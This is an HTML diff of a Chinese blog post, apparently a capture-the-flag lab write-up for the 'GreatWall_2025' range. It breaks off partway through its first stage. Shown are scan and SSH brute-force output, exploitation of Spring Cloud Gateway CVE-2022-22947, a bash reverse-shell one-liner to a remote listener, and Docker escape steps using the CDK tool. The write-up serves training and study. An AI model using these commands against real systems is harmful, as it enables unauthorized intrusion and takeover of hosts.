@@ -1,0 +1,958 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/chongqing.jpg">
+  <link rel="icon" href="/img/chongqing.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="sangnigege">
+  <meta name="keywords" content="一个做事不将就的人，阻止他的只有时间">
+  
+    <meta name="description" content="前言注意：  本文所使用的工具可参考以下仓库： Awesome_Pentest_Tools: 一站式渗透测试与红队工具合集，旨在帮助渗透测试人员打造自己的工具链  靶标介绍： 在这个靶场中，您将扮演一名渗透测试工程师，接受雇佣任务来评估“SmartLink Technologies Ltd.”公司的网络安全状况。 您的任务是首先入侵该公司暴露在公网上的应用服务，然后运用后渗透技巧深入 SmartL">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云镜 GreatWall_2025">
+<meta property="og:url" content="http://example.com/2026/test63/index.html">
+<meta property="og:site_name" content="重庆森林不在重庆">
+<meta property="og:description" content="前言注意：  本文所使用的工具可参考以下仓库： Awesome_Pentest_Tools: 一站式渗透测试与红队工具合集，旨在帮助渗透测试人员打造自己的工具链  靶标介绍： 在这个靶场中，您将扮演一名渗透测试工程师，接受雇佣任务来评估“SmartLink Technologies Ltd.”公司的网络安全状况。 您的任务是首先入侵该公司暴露在公网上的应用服务，然后运用后渗透技巧深入 SmartL">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152218159.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152218621.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152218203.webp">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152218401.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152219996.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152219934.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152219361.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152219219.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152219752.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152219584.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152219390.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152219713.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152219010.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152219013.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152219750.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152219551.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152219009.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152219461.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152219574.webp">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152219501.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152219211.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152219882.png">
+<meta property="article:published_time" content="2026-04-15T10:16:15.754Z">
+<meta property="article:modified_time" content="2026-04-15T14:39:54.835Z">
+<meta property="article:author" content="sangnigege">
+<meta property="article:tag" content="春秋云镜">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152218159.png">
+  
+  
+  
+  <title>春秋云镜 GreatWall_2025 - 重庆森林不在重庆</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"TKccC2BvrQ0jKroA5aUdv8tr-gzGzoHsz","app_key":"rSHs3EnI9lT7nQwv5J7fcBnq","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>重庆森林不在重庆</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="春秋云镜 GreatWall_2025"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-04-15 18:16" pubdate>
+          2026年4月15日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          47 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">春秋云镜 GreatWall_2025</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>注意：</p>
+<blockquote>
+<p>本文所使用的工具可参考以下仓库：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/sangnigege/Awesome_Pentest_Tools">Awesome_Pentest_Tools: 一站式渗透测试与红队工具合集，旨在帮助渗透测试人员打造自己的工具链</a></p>
+</blockquote>
+<p><em>靶标介绍：</em></p>
+<p>在这个靶场中，您将扮演一名渗透测试工程师，接受雇佣任务来评估“SmartLink Technologies Ltd.”公司的网络安全状况。 您的任务是首先入侵该公司暴露在公网上的应用服务，然后运用后渗透技巧深入 SmartLink公司的内部网络。在这个过程中，您将寻找潜在的弱点和漏洞，并逐一接管所有服务，从而控制整个内部网络。靶场中共设置了6个Flag，它们分布在不同的靶机上，您需要找到并获取这些 Flag 作为您的成就目标。</p>
+<h1 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h1><h2 id="Spring-Cloud-Gateway-RCE"><a href="#Spring-Cloud-Gateway-RCE" class="headerlink" title="Spring Cloud Gateway RCE"></a>Spring Cloud Gateway RCE</h2><p>端口扫描</p>
+<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs inform7">qscan -t 8.147.69.40 -p 1-65535 -hY<br>        ┏┓┏┏┏┓┏┓<br>        ┗┫┛┗┗┻┛┗<br>         ┗<br><span class="hljs-comment">[+]</span>2026/03/13 15:04:09 当前环境为：windows, 输出编码为：utf-8<br><span class="hljs-comment">[+]</span>2026/03/13 15:04:09 hydra模块已开启，开始监听暴力破解任务<br><span class="hljs-comment">[*]</span>2026/03/13 15:04:09 当前已开启的hydra模块为：<span class="hljs-comment">[ssh rdp ftp smb telnet mysql mssql oracle postgresql mongodb redis]</span><br><span class="hljs-comment">[+]</span>2026/03/13 15:04:10 所有扫描任务已下发完毕<br>ssh://8.147.69.40:22           ssh                        Version:8.9p1Ubuntu3ubuntu0.13,Info:UbuntuLinux;protocol2,OperatingSystem:Linux,Length:42,ProductName:OpenSSH,Port:22,Digest:SSH-2.0-OpenSSH_8.9p1Ub<br>http://8.147.69.40:80          政务服务平台-门户与办事大厅 Length:10269,FoundDomain:www.w3.org,Digest:政务服务平台门户与办事大厅顶部导航政务服务平台首,Port:80,FingerPrint:后台;Apache;HTML5;Apachehttpd/2.4.52;Apachehttpd;v;(Ubuntu)<br><span class="hljs-comment">[+]</span>2026/03/13 15:05:39 程序执行总时长为：<span class="hljs-comment">[1m30.2623517s]</span><br><br>fscan -h 8.147.69.40<br><br>   ___                              _<br>  / _ \     ___  ___ _ __ __ _  ___| | __<br> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /<br>/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;<br>\____/     |___/\___|_|  \__,_|\___|_|\_\<br>                     fscan version: 1.8.4<br>start infoscan<br>8.147.69.40:8080 <span class="hljs-keyword">open</span><br>8.147.69.40:80 <span class="hljs-keyword">open</span><br>8.147.69.40:22 <span class="hljs-keyword">open</span><br><span class="hljs-comment">[*]</span> alive ports len <span class="hljs-keyword">is</span>: 3<br>start vulscan<br><span class="hljs-comment">[*]</span> WebTitle http://8.147.69.40        code:200 len:10032  title:政务服务平台 - 门户与办事大厅<br><span class="hljs-comment">[*]</span> WebTitle http://8.147.69.40:8080   code:500 len:296    title:None<br>已完成 1/3 <span class="hljs-comment">[-]</span> ssh 8.147.69.40:22 root root#123 ssh: handshake failed: ssh: unable to authenticate, attempted methods <span class="hljs-comment">[none password]</span>, no supported methods remain<br><span class="hljs-comment">[+]</span> PocScan http://8.147.69.40:8080 poc-yaml-spring-actuator-heapdump-file<br><span class="hljs-comment">[+]</span> PocScan http://8.147.69.40:8080 poc-yaml-springboot-env-unauth spring2<br>已完成 2/3 <span class="hljs-comment">[-]</span> ssh 8.147.69.40:22 root 1qaz@WSX ssh: handshake failed: ssh: unable to authenticate, attempted methods <span class="hljs-comment">[none password]</span>, no supported methods remain<br>已完成 2/3 <span class="hljs-comment">[-]</span> ssh 8.147.69.40:22 root Charge123 ssh: handshake failed: ssh: unable to authenticate, attempted methods <span class="hljs-comment">[none password]</span>, no supported methods remain<br>已完成 2/3 <span class="hljs-comment">[-]</span> ssh 8.147.69.40:22 admin admin ssh: handshake failed: ssh: unable to authenticate, attempted methods <span class="hljs-comment">[none password]</span>, no supported methods remain<br>已完成 2/3 <span class="hljs-comment">[-]</span> ssh 8.147.69.40:22 admin test123 ssh: handshake failed: ssh: unable to authenticate, attempted methods <span class="hljs-comment">[none password]</span>, no supported methods remain<br>已完成 2/3 <span class="hljs-comment">[-]</span> ssh 8.147.69.40:22 admin Aa1234. ssh: handshake failed: ssh: unable to authenticate, attempted methods <span class="hljs-comment">[none password]</span>, no supported methods remain<br>已完成 3/3<br><span class="hljs-comment">[*]</span> 扫描结束,耗时: 7m5.6926269s<br><br>./fscan -h 8.147.69.40 -p 1-65535   <br>┌──────────────────────────────────────────────┐<br>│    ___                              _        │<br>│   / _ \     ___  ___ _ __ __ _  ___| | __    │<br>│  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │<br>│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │<br>│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │<br>└──────────────────────────────────────────────┘<br>      Fscan Version: 2.0.0<br><br><span class="hljs-comment">[2025-11-20 21:14:50]</span> <span class="hljs-comment">[INFO]</span> 暴力破解线程数: 1<br><span class="hljs-comment">[2025-11-20 21:14:50]</span> <span class="hljs-comment">[INFO]</span> 开始信息扫描<br><span class="hljs-comment">[2025-11-20 21:14:50]</span> <span class="hljs-comment">[INFO]</span> 最终有效主机数量: 1<br><span class="hljs-comment">[2025-11-20 21:14:50]</span> <span class="hljs-comment">[INFO]</span> 开始主机扫描<br><span class="hljs-comment">[2025-11-20 21:14:50]</span> <span class="hljs-comment">[INFO]</span> 有效端口数量: 65535<br><span class="hljs-comment">[2025-11-20 21:14:50]</span> <span class="hljs-comment">[SUCCESS]</span> 端口开放 8.147.69.40:22<br><span class="hljs-comment">[2025-11-20 21:14:50]</span> <span class="hljs-comment">[SUCCESS]</span> 服务识别 8.147.69.40:22 =&gt; <span class="hljs-comment">[ssh]</span> 版本:8.9p1 Ubuntu 3ubuntu0.13 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:<span class="hljs-comment">[SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13.]</span><br><span class="hljs-comment">[2025-11-20 21:14:52]</span> <span class="hljs-comment">[SUCCESS]</span> 端口开放 8.147.69.40:80<br><span class="hljs-comment">[2025-11-20 21:14:58]</span> <span class="hljs-comment">[SUCCESS]</span> 服务识别 8.147.69.40:80 =&gt; <span class="hljs-comment">[http]</span><br><span class="hljs-comment">[2025-11-20 21:15:31]</span> <span class="hljs-comment">[SUCCESS]</span> 端口开放 8.147.69.40:1041<br><span class="hljs-comment">[2025-11-20 21:15:32]</span> <span class="hljs-comment">[SUCCESS]</span> 服务识别 8.147.69.40:1041 =&gt; <br><span class="hljs-comment">[2025-11-20 21:20:03]</span> <span class="hljs-comment">[SUCCESS]</span> 端口开放 8.147.69.40:8080<br><span class="hljs-comment">[2025-11-20 21:20:18]</span> <span class="hljs-comment">[SUCCESS]</span> 服务识别 8.147.69.40:8080 =&gt; <span class="hljs-comment">[http]</span><br><span class="hljs-comment">[2025-11-20 21:57:25]</span> <span class="hljs-comment">[INFO]</span> 存活端口数量: 4<br><span class="hljs-comment">[2025-11-20 21:57:25]</span> <span class="hljs-comment">[INFO]</span> 开始漏洞扫描<br><span class="hljs-comment">[2025-11-20 21:57:25]</span> <span class="hljs-comment">[INFO]</span> 加载的插件: ssh, webpoc, webtitle<br><span class="hljs-comment">[2025-11-20 21:57:25]</span> <span class="hljs-comment">[SUCCESS]</span> 网站标题 http://8.147.69.40        状态码:200 长度:10032  标题:政务服务平台 - 门户与办事大厅<br><span class="hljs-comment">[2025-11-20 21:58:47]</span> <span class="hljs-comment">[SUCCESS]</span> 目标: http://8.147.69.40:8080<br>  漏洞类型: poc-yaml-springboot-env-unauth<br>  漏洞名称: spring2<br>  详细信息:<br>        links:https://github.com/LandGrey/SpringBootVulExploit<br><span class="hljs-comment">[2025-11-20 21:59:06]</span> <span class="hljs-comment">[SUCCESS]</span> 扫描已完成: 5/5<br><br></code></pre></td></tr></table></figure>
+
+<p>外网入口机器开放了 3 个端口：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PORT</span>     STATE SERVICE VERSION<br><span class="hljs-attribute">22</span>/tcp   open  ssh     OpenSSH <span class="hljs-number">8</span>.<span class="hljs-number">9</span>p1 Ubuntu <span class="hljs-number">3</span>ubuntu0.<span class="hljs-number">13</span> (Ubuntu Linux; protocol <br><span class="hljs-attribute">80</span>/tcp   open  http    Apache httpd <span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">52</span> ((Ubuntu))<br><span class="hljs-attribute">8080</span>/tcp open  rtsp <br></code></pre></td></tr></table></figure>
+
+<p>通过 fscan 的结果发现存在springboot-env-unauth，访问查看 <code>/actuator</code>，访问 &#x2F;actuator&#x2F;env 发现并相关密码和 AK&#x2F;SK，故而 heapdump 文件的下载意义就没有了，经过查看端点信息，发现存在 gateway 接口</p>
+<p>用aforg扫一遍</p>
+<blockquote>
+<p>这个8080端口非常不稳，而且由于回显比较慢，导致挺多工具会判超时</p>
+</blockquote>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-symbol">./afrog</span> <span class="hljs-operator">-</span>t http:<span class="hljs-operator">//</span><span class="hljs-number">8.147</span>.<span class="hljs-number">69.40</span>:<span class="hljs-number">8080</span><span class="hljs-symbol">/</span><br>Downloading the latest version of afrog-pocs...<br>Successfully installed afrog-pocs at <span class="hljs-symbol">/home/matrix/afrog-pocs</span><br><br>Afrog<span class="hljs-symbol">/3.2.0</span> | Security Toolkit | Life is fantastic. Enjoy life.<br>════════════════════════════════════════════════════════<br>[✓] <span class="hljs-params">Core:</span>  <span class="hljs-number">3.2</span>.<span class="hljs-number">0</span>↑ (up to date) <br>[✓] <span class="hljs-params">POC:</span>   <span class="hljs-number">0.5</span>.<span class="hljs-number">13</span>    <br>[✖] <span class="hljs-params">OOB:</span>   ceyeio (Not configured) <br>════════════════════════════════════════════════════════<br><span class="hljs-number">001</span> <span class="hljs-number">1</span>1-<span class="hljs-number">20</span> <span class="hljs-number">22</span>:<span class="hljs-number">52</span>:<span class="hljs-number">12</span> springboot-actuator INFO http:<span class="hljs-operator">//</span><span class="hljs-number">8.147</span>.<span class="hljs-number">69.40</span>:<span class="hljs-number">8080</span><span class="hljs-symbol">/actuator</span> <br><span class="hljs-number">002</span> <span class="hljs-number">1</span>1-<span class="hljs-number">20</span> <span class="hljs-number">22</span>:<span class="hljs-number">57</span>:<span class="hljs-number">35</span> springboot-actuator-unauth HIGH http:<span class="hljs-operator">//</span><span class="hljs-number">8.147</span>.<span class="hljs-number">69.40</span>:<span class="hljs-number">8080</span><span class="hljs-symbol">/actuator</span> <br><span class="hljs-number">003</span> <span class="hljs-number">1</span>1-<span class="hljs-number">20</span> <span class="hljs-number">23</span>:<span class="hljs-number">04</span>:<span class="hljs-number">25</span> CVE-<span class="hljs-number">202</span>2-<span class="hljs-number">22947</span> CRITICAL http:<span class="hljs-operator">//</span><span class="hljs-number">8.147</span>.<span class="hljs-number">69.40</span>:<span class="hljs-number">8080</span><span class="hljs-symbol">/actuator/gateway/refresh</span> <br>[━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━] <span class="hljs-number">100</span>% (<span class="hljs-number">1619</span><span class="hljs-operator">/</span><span class="hljs-number">1619</span>), <span class="hljs-number">22</span>m13s<br></code></pre></td></tr></table></figure>
+
+<p>出洞了，Spring Cloud Gateway RCE（<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/spring/CVE-2022-22947">CVE-2022-22947</a>）</p>
+<p>注：该漏洞容易“打坏”，重复利用会导致路由刷新失效或需要长时间才能生效，建议使用漏洞利用工具一次打成功。</p>
+<p>用综合利用工具打一遍</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152218159.png" srcset="/img/loading.gif" lazyload alt="image-20251120211623357"></p>
+<p>可以命令执行，但反弹shell失败，应该是不出网</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">bash -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/公网IP/54500 0&gt;&amp;1&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>打内存马，可以用上面的综合工具，可以用脚本：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/0730Nophone/CVE-2022-22947-">0730Nophone&#x2F;CVE-2022-22947-: Spring Cloud Gateway Actuator API SpEL表达式注入命令执行（CVE-2022-22947） 注入哥斯拉内存马</a></p>
+<h2 id="Docker-逃逸"><a href="#Docker-逃逸" class="headerlink" title="Docker 逃逸"></a>Docker 逃逸</h2><p>连接上 webshell 后没发现 flag 文件，且存在 .dockerenv 文件，需要进行 docker 逃逸。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152218621.png" srcset="/img/loading.gif" lazyload alt="image-20260313220432796"></p>
+<p>执行 <code>find / -name core_pattern</code> 可以看见容器中存在两个 core_pattern 文件，其中一个是宿主机上被挂载出来的。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152218203.webp" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p>准备上传 CDK 进行利用，但 Web 环境存在上传大小限制，需要将文件进行压缩、分割再上传、合并后使用。</p>
+<p>使用 upx 压缩命令（也可以下载cdk_linux_amd64_thin_upx，本身就小）：</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">upx cdk_linux</span><br></code></pre></td></tr></table></figure>
+
+<p>分割为每份 100k 大小：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">split</span> -b <span class="hljs-number">100</span>k cdk_linux cdk.<br></code></pre></td></tr></table></figure>
+
+<p>合并为一个完整文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> cdk.* &gt; cdk<br><span class="hljs-comment"># 重组后对比md5值，确保没有损坏</span><br><span class="hljs-built_in">md5sum</span> cdk<br><span class="hljs-comment"># 赋可执行权限</span><br><span class="hljs-built_in">chmod</span> 777 cdk<br></code></pre></td></tr></table></figure>
+
+<p>容器逃逸检测</p>
+<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 